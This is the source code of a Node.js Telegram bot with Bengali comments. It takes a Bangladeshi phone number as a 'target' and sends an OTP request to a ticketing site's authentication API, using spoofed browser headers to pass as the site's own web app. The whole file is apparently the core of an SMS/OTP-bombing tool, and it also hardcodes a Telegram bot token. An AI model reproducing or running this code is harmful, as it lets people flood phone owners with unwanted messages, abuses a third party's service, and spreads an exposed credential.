const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const http = require('http');

const token = '8784762504:AAFiS-NC-2BSnDauKrTM9GFQ3n91c6_OPfk';
const bot = new TelegramBot(token, {polling: true});

// Render/Cloud সচল রাখার জন্য
http.createServer((req, res) => {
    res.write("S.R.M TELECOM API Fix Active!");
    res.end();
}).listen(process.env.PORT || 3000);

console.log("🚀 S.R.M TELECOM (Exact Header Mode) চালু হয়েছে...");

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (text && text.length === 11 && text.startsWith('01')) {
        bot.sendMessage(chatId, `🚀 টার্গেট: ${text}\nঅরিজিনাল হেডার দিয়ে ওটিপি পাঠানো হচ্ছে...`);

        try {
            // আপনার দেওয়া রেসপন্স অনুযায়ী নিখুঁত রিকোয়েস্ট
            const response = await axios.post('https://api.bdtickets.com:20100/v1/auth', {
                createUserCheck: true,
                phoneNumber: "+88" + text,
                applicationChannel: "WEB_APP"
            }, {
                headers: {
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/json;charset=UTF-8',
                    'Origin': 'https://bdtickets.com',
                    'Referer': 'https://bdtickets.com/',
                    'Sec-Ch-Ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
                    'Sec-Ch-Ua-Mobile': '?1',
                    'Sec-Ch-Ua-Platform': '"Android"',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-site',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36'
                },
                withCredentials: true, // আপনার রেসপন্সে এটি true ছিল
                timeout: 10000
            });

            if (response.status === 200) {
                bot.sendMessage(chatId, `✅ মিশন সফল! সার্ভার রেসপন্স: ২০০ (ওটিপি পাঠানো হয়েছে)`);
            }
        } catch (e) {
            console.log("Error logic applied");
            bot.sendMessage(chatId, `❌ এপিআই ব্লক অথবা কানেকশন এরর!`);
        }
    }
});
